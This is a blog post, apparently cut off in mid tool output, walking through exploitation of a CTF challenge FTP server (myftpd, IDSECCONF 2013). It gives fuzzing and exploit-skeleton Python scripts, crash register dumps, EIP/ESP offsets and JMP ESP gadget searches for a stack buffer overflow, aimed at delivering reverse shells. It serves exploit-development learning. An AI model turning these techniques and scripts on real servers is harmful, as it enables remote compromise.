["https://buffered.io/posts/idsecconf-2013-myftpd-challenge"]
title = "IDSECCONF 2013 myftpd challenge · OJ Reeves"
description = """
Update 2018-09-13

Lots of people have asked for a copy of the binary so that they can play along with this. I’ve contacted Ammar and he has said it’s ok for me to provide it here. So for those that are keen to have a go at this themselves, have at it!.

On with the Show

With OSCE out of the way and the family in need of a break from me doing study and certifications, I decided to turn my hand to some fun exploit challenges to keep up the practice. To a wannabe bug exploiter such as myself, there are plenty of options out there which are great for fun and practice. Some of those options are:


Downloading an application with a known vulnerability and exploit and practising on that.
Downloading a proof of concept crash from ExploitDB and turning it into a full exploit.
Reading sites such as Corelan and Fuzzy Security, who both have great exploit tutorials. However, instead of reading through the walk-throughs, download the vulnerable applications and attempt to exploit them yourself.
Getting some “exploitme” style challenges from some bygone CTFs. A great place to go is ShellStorm, which contains an archive of lots of these.


On this particular day I thought I’d try one of the harder exploitme challenges and it just so happened that something appeared in my Twitter feed that pointed me to Ammar’s post discussing a level 500 exploit challenge from the IDSECCONF 2013 CTF. To quote Ammar:


… during the IDSECCONF offline CTF, none of the team were able to wrap
up a working remote exploit, although one team were able to get [the]
correct offset to overwrite EIP …


This had the hallmarks of being tricky and fun! I asked Ammar if the binary was still available and he kindly made it available for download (head to his site if you would like to have a shot at it yourself).

What follows is my dissection of the binary, along with my approach to exploiting it so that it would allow the attacker to submit any payload including reverse Meterpreter shells, bind shells and VNC injection. If you’re keen to take this challenge on by yourself, please don’t read this as it’s a blatant spoiler. Otherwise, let’s get stuck in!"""
full_description = "IDSECCONF 2013 myftpd challenge Published 2014-03-01 by OJ Reeves Read time: 43 min Update 2018-09-13 Lots of people have asked for a copy of the binary so that they can play along with this. I’ve contacted Ammar and he has said it’s ok for me to provide it here. So for those that are keen to have a go at this themselves, have at it!. On with the Show With OSCE out of the way and the family in need of a break from me doing study and certifications, I decided to turn my hand to some fun exploit challenges to keep up the practice. To a wannabe bug exploiter such as myself, there are plenty of options out there which are great for fun and practice. Some of those options are: Downloading an application with a known vulnerability and exploit and practising on that. Downloading a proof of concept crash from ExploitDB and turning it into a full exploit. Reading sites such as Corelan and Fuzzy Security, who both have great exploit tutorials. However, instead of reading through the walk-throughs, download the vulnerable applications and attempt to exploit them yourself. Getting some “exploitme” style challenges from some bygone CTFs. A great place to go is ShellStorm, which contains an archive of lots of these. On this particular day I thought I’d try one of the harder exploitme challenges and it just so happened that something appeared in my Twitter feed that pointed me to Ammar’s post discussing a level 500 exploit challenge from the IDSECCONF 2013 CTF. To quote Ammar: … during the IDSECCONF offline CTF, none of the team were able to wrap up a working remote exploit, although one team were able to get [the] correct offset to overwrite EIP … This had the hallmarks of being tricky and fun! I asked Ammar if the binary was still available and he kindly made it available for download (head to his site if you would like to have a shot at it yourself). What follows is my dissection of the binary, along with my approach to exploiting it so that it would allow the attacker to submit any payload including reverse Meterpreter shells, bind shells and VNC injection. If you’re keen to take this challenge on by yourself, please don’t read this as it’s a blatant spoiler. Otherwise, let’s get stuck in! The Tools For this exploit, I used: The Immunity Debugger. I know I really need to get back into [Windbg][] now that OSCE is over, but cut me some slack. The Mona.py plug-in written by the legendary Corelanc0d3r. The machine I did this on was a Windows XP SP3 machine. The target machine for the CTF was apparently XP SP2, hence my decision to use this instead of Windows 7. If you want to follow along, get yourself these tools, configure them and have them ready to go. The FTP Server The zip file that I downloaded contained one binary called myftpd.exe with a configuration file called passwd.conf. I started by opening the passwd.conf file to see what was inside: test|test|c:|0 Obviously this is a list of users that are able to access the application and so it’s probably safe to assume that a valid login is test/test. Upon launching the application we’re presented with a rather nice black console which is used to show activity on the server: Nothing too crazy going on here. We can see that it handles the basic commands, but there’s nothing too juicy going on. Given that we know this thing is supposed to be hosed remotely, let’s get a basic fuzzing script together and see if we can break it. I decided to go with something custom and very rudimentary to begin with, and the reason for this was because it’s a CTF exploitme, and I felt that the goal here was to get past a quirky exploit rather than spend a long period of time fuzzing. My guess paid off pretty quickly and it saved me from having to worry about more complicated fuzzing techniques and applications. Fuzzing the Server We know that the first thing we need to do when signing in to the server is to issue the USER command, so for me this was the first logical point of call. I whipped up a quick python script which generated bigger and bigger user names to throw at the application. It looks like this: #!/usr/bin/python import socket host = '10.1.10.34' port = 21 def fuzz(payload): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.recv(2048) s.send(payload) s.shutdown s.close print \"[*] Fuzzing {0}:{1} ...\".format(host, port) for i in range(1, 100): name = \"A\" * (i * 0x10) command = \"USER {0}\\r\\n\".format(name) print \"[*] Username {0} chars, Command {1} chars...\".format(len(name), len(command)) fuzz(command) As you can see this script is really simple, and just increments the size of the payload to deploy until things break. I went ahead and attached Immunity to the server and kicked off my script. To my annoyance the developers of application has put a breakpoint in the code when a user connects. Obviously the goal here was to stop us from fuzzing under a debugger: To get around this problem I just modified the assembly inline using Immunity so that the breakpoint (CC) instruction was instead a NOP (90) instruction like so: With this out of the way the script ran nicely. Until… $ ./fuzz.py [*] Fuzzing 10.1.10.34:21 ... [*] Username 16 chars, Command 23 chars... [*] Username 32 chars, Command 39 chars... [*] Username 48 chars, Command 55 chars... [*] Username 64 chars, Command 71 chars... [*] Username 80 chars, Command 87 chars... [*] Username 96 chars, Command 103 chars... [*] Username 112 chars, Command 119 chars... [*] Username 128 chars, Command 135 chars... [*] Username 144 chars, Command 151 chars... [*] Username 160 chars, Command 167 chars... [*] Username 176 chars, Command 183 chars... [*] Username 192 chars, Command 199 chars... [*] Username 208 chars, Command 215 chars... [*] Username 224 chars, Command 231 chars... [*] Username 240 chars, Command 247 chars... [*] Username 256 chars, Command 263 chars... [*] Username 272 chars, Command 279 chars... [*] Username 288 chars, Command 295 chars... [*] Username 304 chars, Command 311 chars... When the username hit 304 characters, things turned bad for the server. Immunity showed the following information about the registers: EAX 00000000 ECX 0024A9C0 EDX 0000002F EBX 41414141 ESP 00B5FFC0 EBP 41414141 ESI 41414141 EDI 41414141 EIP 41414141 At this point it looks like we have a “vanilla” EIP overwrite. Taking a look at the stack window we can see something interesting: 00B5FF90 00000000 .... 00B5FF94 00000000 .... 00B5FF98 00000000 .... 00B5FF9C 41414141 AAAA 00B5FFA0 41414141 AAAA 00B5FFA4 41414141 AAAA 00B5FFA8 41414141 AAAA 00B5FFAC 41414141 AAAA 00B5FFB0 41414141 AAAA 00B5FFB4 41414141 AAAA 00B5FFB8 41414141 AAAA 00B5FFBC 00000A00 .... 00B5FFC0 0024A760 `§$. <-- ESP points here 00B5FFC4 00249E10 \u0010ž$. 00B5FFC8 0022DCF8 øÜ\". 00B5FFCC 7FFDE000 .àý\u007F 00B5FFD0 825C2600 .&\\‚ 00B5FFD4 00B5FFC0 Àÿµ. 00B5FFD8 823B54B8 ¸T;‚ 00B5FFDC FFFFFFFF ÿÿÿÿ End of SEH chain 00B5FFE0 7C839AC0 Àšƒ| SE handler 00B5FFE4 7C80B720 ·€| kernel32.7C80B720 00B5FFE8 00000000 .... 00B5FFEC 00000000 .... 00B5FFF0 00000000 .... 00B5FFF4 004013C0 À\u0013@. myftpd.004013C0 00B5FFF8 0022DCF8 øÜ\". 00B5FFFC 00000000 .... -- this is the end of the memory region -- From the above dump we can see that there’s a chance we can redirect the flow of code to something we control by pointing EIP to a known instruction for either a PUSH ESP # RET, CALL ESP or JMP ESP instruction. Before we look into that, it’s worth noting that this memory dump ends at 00B5FFFC, which means that we probably can’t write too much information otherwise we’ll crash the process in a different way. The other thing that stands out here is that the first part of the payload has be set to zero (we can’t see USER anywhere here) so it would appear that the front part of the buffer is clobbered by something before we get here. I changed my fuzzing script a little and did some trial and error. It turns out that the use of USER isn’t actually required to cause the crash. I also found that the payload size could only be up to 365 characters, as any more would result in an exception. I fired a command which was simply a string of 365 A characters without a \\r\\n suffix. This is what the stack looked like: 00B5FF90 00000000 .... 00B5FF94 00000000 .... 00B5FF98 00000000 .... 00B5FF9C 41414141 AAAA 00B5FFA0 41414141 AAAA 00B5FFA4 41414141 AAAA 00B5FFA8 41414141 AAAA 00B5FFAC 41414141 AAAA 00B5FFB0 41414141 AAAA 00B5FFB4 41414141 AAAA 00B5FFB8 41414141 AAAA 00B5FFBC 41414141 AAAA 00B5FFC0 41414141 AAAA 00B5FFC4 41414141 AAAA 00B5FFC8 41414141 AAAA 00B5FFCC 41414141 AAAA 00B5FFD0 41414141 AAAA 00B5FFD4 41414141 AAAA 00B5FFD8 41414141 AAAA 00B5FFDC 41414141 AAAA Pointer to next SEH record 00B5FFE0 41414141 AAAA SE handler 00B5FFE4 41414141 AAAA 00B5FFE8 41414141 AAAA 00B5FFEC 41414141 AAAA 00B5FFF0 41414141 AAAA 00B5FFF4 41414141 AAAA 00B5FFF8 41414141 AAAA 00B5FFFC 00414141 AAA. What’s interesting here is that a NULL byte is being written to memory at 00B5FFFF, just something to bear in mind later on. Controlling EIP The next thing to do is to start crafting an exploit, and in order to execute our own code we need to control EIP. First we need to know the offset of the bytes that overwrite EIP and for this we’ll use the tried and true pattern_create.rb along with its cohort pattern_offset.rb. However, I’m not a fan of having massive exploit payloads directly pasted into my source code, so instead I read the files in. We create the pattern file like so: $ pattern_create.rb 356 > pattern.txt We then begin our exploit with a simple shell that looks like this: #!/usr/bin/python import socket host = '10.1.10.34' port = 21 def read_file(path): with open(path, 'r') as f: return f.read() def pwn(payload): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.recv(2048) s.send(payload) s.shutdown s.close print \"[*] Attacking {0}:{1} ...\".format(host, port) command = read_file('pattern.txt') print \"[*] Command {0} chars...\".format(len(command)) pwn(command) If we launch this script, the program crashes with the following register content: EAX 00000000 ECX 0024CF98 EDX 00000031 EBX 336A4132 ESP 00B5FFC0 ASCII \"0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al\" EBP 376A4136 ESI 41346A41 EDI 6A41356A EIP 41386A41 For now we’re only interested in the offset of EIP and ESP, and the point at which the NULL bytes stop being written; if we need others then we will figure them out later: $ pattern_offset.rb 0Ak1 [*] Exact match at offset 302 $ pattern_offset.rb 41386A41 [*] Exact match at offset 294 $ pattern_offset.rb 8Ai9 [*] Exact match at offset 266 Here we can see that EIP and ESP are actually quite close together. Let’s modify our exploit to see if we have our offsets correct (we’ll worry about the shellcode start later). The script now looks like this: #!/usr/bin/python import socket host = '10.1.10.34' port = 21 def read_file(path): with open(path, 'r') as f: return f.read() def pwn(payload): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.recv(2048) s.send(payload) s.shutdown s.close max_size = 365 offsets = { 'SC': 266, 'EIP': 294, 'ESP': 302, } print \"[*] Attacking {0}:{1} ...\".format(host, port) command = \"\" command += \"A\" * (offsets['EIP'] - len(command)) command += \"BBBB\" command += \"C\" * (offsets['ESP'] - len(command)) command += \"DDDD\" command += \"E\" * (max_size - len(command)) print \"[*] Command {0} chars...\".format(len(command)) pwn(command) Running this command gives us the following register content when crashed: EAX 00000000 ECX 0024CF98 EDX 00000031 EBX 41414141 ESP 00B5FFC0 ASCII \"DDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\" EBP 41414141 ESI 41414141 EDI 41414141 EIP 42424242 Our offsets are spot on. Next we need to find an address that we can use to overwrite ESP with. Preferably we’ll use a JMP ESP instruction instead of the other options because this will not modify the content of memory around ESP (which would be bad in case it overwrites stuff that’s important to us). Here we’ll use Mona.py within immunity to give us a list of addresses that we can use. Ideally our exploit would not be tied to a given platform, so we would ultimately like to find an address which isn’t tied to any Windows DLLs. We start by searching for jump instructions within the myftpd process itself because we know this will translate across platforms: !mona jmp -r ESP -m myftpd Unfortunately for us, all we get is: ---------- Mona command started on 2014-02-28 22:29:14 (v2.0, rev 427) ---------- 0BADF00D [+] Processing arguments and criteria 0BADF00D - Pointer access level : X 0BADF00D - Only querying modules myftpd 0BADF00D [+] Generating module info table, hang on... 0BADF00D - Processing modules 0BADF00D - Done. Let's rock 'n roll. 0BADF00D [+] Querying 1 modules 0BADF00D - Querying module myftpd.exe 0BADF00D - Search complete, processing results 0BADF00D [+] Preparing output file 'jmp.txt' 0BADF00D - (Re)setting logfile jmp.txt 0BADF00D Found a total of 0 pointers 0BADF00D [+] This mona.py action took 0:00:00.265000 There are no addresses in the executable which we can use to redirect control to ESP. So we have to look further. We instead let Monay go nuts on all the modules: !mona jmp -r ESP And we get a listing that looks like the following: ---------- Mona command started on 2014-02-28 22:27:28 (v2.0, rev 427) ---------- 0BADF00D [+] Processing arguments and criteria 0BADF00D - Pointer access level : X 0BADF00D [+] Generating module info table, hang on... 0BADF00D - Processing modules 0BADF00D - Done. Let's rock 'n roll. 0BADF00D [+] Querying 13 modules 0BADF00D - Querying module WS2_32.DLL 71A90000 Modules C:\\WINDOWS\\System32\\wshtcpip.dll 0BADF00D - Querying module mswsock.dll 0BADF00D - Querying module myftpd.exe 0BADF00D - Querying module GDI32.dll 0BADF00D - Querying module ADVAPI32.dll 0BADF00D - Querying module kernel32.dll 0BADF00D - Querying module msvcrt.dll 0BADF00D - Querying module Secur32.dll 0BADF00D - Querying module ntdll.dll 0BADF00D - Querying module WS2HELP.dll 0BADF00D - Querying module RPCRT4.dll 0BADF00D - Querying module hnetcfg.dll 0BADF00D - Querying module USER32.dll 0BADF00D - Search complete, processing results 0BADF00D [+] Preparing output file 'jmp.txt' 0BADF00D - (Re)setting logfile jmp.txt 0BADF00D [+] Writing results to jmp.txt 0BADF00D - Number of pointers of type 'jmp esp' : 14 0BADF00D - Number of pointers of type 'call esp' : 10 0BADF00D - Number of pointers of type 'push esp # ret ' : 9 0BADF00D [+] Results : 77F31D2F 0x77f31d2f : jmp esp | {PAGE_EXECUTE_READ} [GDI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\\WINDOWS\\system32\\GDI32.dll) 77DEF049 0x77def049 : jmp esp | {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\\WINDOWS\\system32\\ADVAPI32.dll) 77DF965B 0x77df965b : jmp esp | {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\\WINDOWS\\system32"
